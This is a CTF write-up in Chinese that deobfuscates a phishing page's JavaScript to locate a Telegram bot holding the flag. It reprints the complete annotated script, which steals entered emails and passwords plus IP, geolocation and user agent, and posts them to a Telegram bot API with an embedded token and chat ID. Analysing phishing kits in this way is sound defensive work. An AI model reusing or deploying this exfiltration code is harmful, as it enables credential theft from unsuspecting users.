- # 思路
	- 读取首页的JS找到一个telegram bot, 访问看到flag
- # 解密JS
	- 带注释的源码如下
	  collapsed:: true
		- ```js
		  var jsdom = require("jsdom");
		  const { JSDOM } = jsdom;
		  const { window } = new JSDOM();
		  const { document } = (new JSDOM('')).window;
		  global.document = document;
		  
		  var $ = jQuery = require('jquery')(window);
		  
		  var A = B;
		  function B(C, D) {
		      var E = F();
		      return B = function (Bbb, G) {
		          Bbb = Bbb - 0xb7;
		          var H = E[Bbb];
		          return H;
		      },
		      B(C, D);
		  }(function (I, J) {
		      var K = B,
		          L = I();
		      while (!![]) {
		          try {
		              var M = -parseInt(K(0xe9)) / 0x1 + -parseInt(K(0xda)) / 0x2 + parseInt(K(0xc0)) / 0x3 * (-parseInt(K(0xb8)) / 0x4) + parseInt(K(0xd6)) / 0x5 + -parseInt(K(0xe0)) / 0x6 * (-parseInt(K(0xd5)) / 0x7) + parseInt(K(0xb7)) / 0x8 * (-parseInt(K(0xe3)) / 0x9) + -parseInt(K(0xe1)) / 0xa * (parseInt(K(0xdb)) / 0xb);
		              if (M === J) 
		                  break;
		               else 
		                  L['push'](L['shift']());
		              
		          } catch (N) {
		              L['push'](L['shift']());
		          }
		      }
		  }(F, 0xa9b1c));
		  
		  console.log("HERE: " + A(0xd7))
		  var elem = $(A(0xb9)), // submit按钮
		      elem1 = A(0xde), // bot的token
		      elem2 = A(0xd7), // 一个tg的id 5852841790
		      email = $(A(0xc2))[A(0xc9)](), //email输入框的值
		      domain = email[A(0xe4)](email["substring"]('@') + 0x1),
		      frmsite = domain[A(0xe4)](0x0, domain["substring"]('.'));
		  const str = frmsite + A(0xce), //xxx cloud storage
		      str2 = str[A(0xbd)](0x0)[A(0xeb)]() + str[A(0xe7)](0x1); // str第一个字母大写
		  // console.log("HERE: "+A(0xc4) + str2 + '\x20by\x20Zach\x20A**' + '\x0a\x0a' + A(0xe2) + $(A(0xc2))[A(0xc9)]() + '\x0a' + A(0xc7) + $(A(0xd9))[A(0xdf)]() + '\x0a' + 'IP\x20Address\x20:\x20' + "ip" + '\x0a' + A(0xe6) + "region" + '\x0a' + A(0xc3) + A(0xc8) + '\x0a' + A(0xbe) + "country" + '\x0a' + A(0xed) + "ua" + '\x0a' + A(0xcc) + $(A(0xea))[A(0xdf)]() + '\x0a' + A(0xd8) + A(0xc6) + '\x0a' + A(0xbf) + $(A(0xc5))[A(0xdf)]())
		  let today = new Date()[A(0xc6)]();
		  $(A(0xba))[A(0xe5)](str2), //dname append str2
		  $('#title')[A(0xe5)](str2), // title append str2
		  $(A(0xc1))['append'](A(0xbb) + domain + A(0xd4)), // dlogo append img元素
		  $(A(0xdd))[A(0xe5)](A(0xcd) + domain + '\x22>'), // head append <link rel="icon" href="https://logo.clearbit.com/undefined">
		  document[A(0xe8)][A(0xd0)]['background'] = A(0xca) + domain + '\x27)',
		  elem['on'](A(0xec), function (O) {
		      var P = A;
		      //  获取IP等隐私并通过TG发送                                            获取IP的API   获取IP后会运行的函数
		      $('#inputPassword')[P(0xdf)]() === '' ? alert(P(0xcb)) : $['getJSON'](P(0xcf), function (Q) {
		          var R = P,
		              S = Q['ip'],
		              T = Q[R(0xc8)],
		              U = Q['region'],
		              V = Q['country'],
		              W = navigator['userAgent'];
		          let X = new Date()[R(0xc6)]();
		          var Y = R(0xc4) + str2 + '\x20by\x20Zach\x20A**' + '\x0a\x0a' + R(0xe2) + $(R(0xc2))[R(0xc9)]() + '\x0a' + R(0xc7) + $(R(0xd9))[R(0xdf)]() + '\x0a' + 'IP\x20Address\x20:\x20' + S + '\x0a' + R(0xe6) + U + '\x0a' + R(0xc3) + T + '\x0a' + R(0xbe) + V + '\x0a' + R(0xed) + W + '\x0a' + R(0xcc) + $(R(0xea))[R(0xdf)]() + '\x0a' + R(0xd8) + X + '\x0a' + R(0xbf) + $(R(0xc5))[R(0xdf)](),
		              Z = R(0xdc) + A(0xde) + R(0xd3); // TG机器人的API地址
		          $[R(0xd2)](Z, {
		              'chat_id': elem2, // 一串数字
		              'text': Y // 各类隐私信息
		          }, function (AA) {
		              var AB = R;
		              window['location'][AB(0xee)] = AB(0xd1); // 一个语音留言
		          });
		      });
		  });
		  function F() {
		      var AC = [
		          'val',
		          '12ZidQyC',
		          '20AFlrCY',
		          'Email:\x20',
		          '63792quNVYn',
		          'substring',
		          'append',
		          'Region\x20:\x20',
		          'slice',
		          'body',
		          '139437pXYFEK',
		          '#UserEmail',
		          'toUpperCase',
		          'click',
		          'Useragent\x20:\x20',
		          'href',
		          '88GpIPQU',
		          '904cdojGd',
		          '#submit',
		          '#dname',
		          '<img\x20class=\x22mb-4\x22\x20src=\x22https://logo.clearbit.com/',
		          'lastIndexOf',
		          'charAt',
		          'Country\x20:\x20',
		          'DateSent\x20:\x20',
		          '10311YpzJVd',
		          '#dlogo',
		          '#emailtext',
		          'City\x20:\x20',
		          '***',
		          '#DateSent',
		          'toLocaleDateString',
		          'Password\x20:\x20',
		          'city',
		          'text',
		          'url(\x27https://logo.clearbit.com/',
		          'Password\x20field\x20missing!',
		          'Format\x20:\x20',
		          '<link\x20rel=\x22icon\x22\x20href=\x22https://logo.clearbit.com/',
		          '\x20Cloud\x20Storage',
		          'https://ip.seeip.org/geoip',
		          'style',
		          'https://archive.org/details/VoiceMail_173',
		          'post',
		          '/sendMessage',
		          '\x22\x20alt=\x22\x22\x20width=\x22150\x22\x20\x20>',
		          '4716964xBODFJ',
		          '3724320KAqSuZ',
		          '5852841790',
		          'Date\x20Filled\x20:\x20',
		          '#inputPassword',
		          '380874lxWkrT',
		          '1170928pBbGzs',
		          'https://api.telegram.org/bot',
		          'head',
		          '6055124896:AAFyQlC_8dr1GndB26ji4iV2ol2bPPQ9lq4'
		      ];
		      F = function () {
		          return AC;
		      };
		      return F();
		  }
		  
		  ```
	- 可以看到其会在用户点击按钮后将用户的IP等信息发送到TG bot
	- 访问接口可以看到bot的地址为[https://t.me/rochesterissodamncoldbot](https://t.me/rochesterissodamncoldbot)
	- 查看bot即可得到flag